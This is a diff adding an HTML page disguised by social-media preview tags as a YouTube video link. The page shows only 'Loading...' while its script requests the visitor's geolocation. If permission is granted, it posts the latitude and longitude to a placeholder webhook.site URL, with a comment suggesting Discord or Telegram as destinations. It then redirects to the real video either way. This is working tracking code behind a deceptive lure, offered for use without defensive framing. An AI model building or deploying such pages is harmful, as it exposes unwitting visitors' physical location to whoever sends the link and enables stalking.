@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- 🧠 Social Media Preview -->
+  <meta property="og:title" content="You need to see this! 😱">
+  <meta property="og:description" content="Best moment of 2025.">
+  <meta property="og:image" content="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg">
+  <meta property="og:url" content="https://youtube.com/watch?v=dQw4w9WgXcQ">
+
+  <title>Loading...</title>
+</head>
+<body>
+  <p>Loading... Please wait.</p>
+
+  <script>
+    // 🔍 Try to get geolocation with permission
+    navigator.geolocation.getCurrentPosition(
+      function(pos) {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+
+        // Send to your Discord, Telegram, or save via webhook
+        fetch("https://webhook.site/your-custom-link", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ latitude: lat, longitude: lon })
+        });
+
+        // Then redirect to real YouTube video
+        window.location.href = "https://youtube.com/watch?v=dQw4w9WgXcQ";
+      },
+
+      function(err) {
+        // Even if denied, still redirect
+        window.location.href = "https://youtube.com/watch?v=dQw4w9WgXcQ";
+      }
+    );
+  </script>
+</body>
+</html>
